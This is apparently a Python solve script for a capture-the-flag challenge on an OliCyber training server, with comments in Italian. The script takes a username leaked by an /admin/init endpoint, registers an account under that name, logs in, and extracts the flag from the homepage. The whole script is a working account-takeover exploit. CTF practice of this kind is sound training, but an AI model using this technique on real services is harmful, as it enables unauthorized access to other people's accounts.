import requests
import secrets
import re

BASE_URL = "http://zio-frank.challs.olicyber.it"
flag_re="flag{.*}"
s = requests.Session()

# 1. Ottieni payload vulnerabile
r = s.post(f"{BASE_URL}/admin/init")
if r.status_code != 200:
    raise Exception("Errore nella richiesta /admin/init")

payload = r.json()
print("[*] Payload iniziale:", payload)

# 2. Genera password random e registra l'account
password = secrets.token_hex(16)
registration_payload = {
    "username": payload.get("username"),
    "password": password,
    "password2": password
}

print("[*] Payload registrazione:", registration_payload)

r = s.post(f"{BASE_URL}/register", data=registration_payload)
print("[*] Risposta registrazione:", r.text)

# 3. Login (solo username + password)
login_payload = {
    "username": registration_payload["username"],
    "password": registration_payload["password"]
}

r = s.post(f"{BASE_URL}/login", data=login_payload)
print("[*] Risposta login:", r.text)

# 4. Visita homepage come utente autenticato
r = s.get(BASE_URL)
print("[*] Homepage:")
result = re.search(flag_re, r.text)
print(result.group(0))